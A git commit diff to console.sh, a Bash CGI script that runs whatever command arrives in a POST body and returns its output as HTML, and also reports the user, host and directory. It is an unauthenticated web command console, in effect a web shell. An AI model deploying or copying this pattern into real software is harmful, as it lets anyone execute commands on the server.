4ecc9e032b01c0811a44a6e82f641bea171f00c0
William Sampaio <1997wbms@gmail.com>
2022-12-15 19:17:50 -0400

    finish

--- console.sh
+++ console.sh
@@ -4,15 +4,19 @@ urldecode() {
   printf '%b' "${encoded//%/\\x}"
 }
 
-echo "Content-Type: application/json"
-echo ""
-
 if [ "$REQUEST_METHOD" = "POST" ]; then
-    VAR=$(sed -n '1p')
-    DECODED=$(urldecode "$VAR")
-    cmdln=$(echo $DECODED | awk -F= '{print $2}')
-    stdout=$($cmdln)
-    printf '{"stdout": "%s"}' "$stdout"
+  echo "Content-Type: text/html"
+  echo ""
+
+  header="$(whoami)@$(hostname):$(pwd)$"
+  VAR=$(sed -n '1p')
+  DECODED=$(urldecode "$VAR")
+  cmdln=$(echo $DECODED | awk -F= '{print $2}')
+  echo "<pre>$($cmdln)</pre>"
 else
-    echo '{"stdout": "Hello World!"}'
+  echo "Content-Type: application/json"
+  echo ""
+
+  header="$(whoami)@$(hostname):$(pwd)$"
+  echo '{"header": "'$header'","stdout": "Hello World_"}'
 fi
